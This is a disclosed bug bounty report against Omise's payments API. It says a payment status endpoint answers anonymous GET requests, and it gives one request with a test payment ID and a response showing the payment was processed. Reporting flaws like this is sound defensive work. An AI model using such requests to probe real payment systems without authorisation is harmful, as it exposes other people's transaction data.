# Anonymous access control - Payments Status

## Report Details
- **Report ID**: 1546726
- **URL**: https://hackerone.com/reports/1546726
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-04-21T11:10:23.742Z
- **Disclosed**: 2022-08-07T01:59:29.530Z

## Reporter
- **Username**: codeslayer1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: omise

## Vulnerability Information
## Summary:
Found on the Payments Status function website, it can be accessed anonymously. payment status should only be accessible by accounts that make payments in a state that has successfully logged in.

## Steps To Reproduce:
access anonymously (without logging in) to the payment status function as in the example below

  1. Request:
GET /payments/paym_test_5rjz482tky43reoil9f/status HTTP/2
Host: api.omise.co
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://api.omise.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

2. Response:
HTTP/2 200 OK
Date: Thu, 21 Apr 2022 10:57:37 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 18
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin
Cache-Control: no-cache, no-store
Etag: W/"c9e654e8902aa47de7edcd7ab902ed16"
Set-Cookie: locale=en; path=/
X-Request-Id: 26180027472066089
Strict-Transport-Security: max-age=31536000; includeSubDomains

{"processed":true}

## Impact

Attackers can see payment status on the account's website without having to log in (anonymous)

Best regards,


CodeSlayer137

## Attachments
- Screen_Shot_2022-04-21_at_18.09.49.png
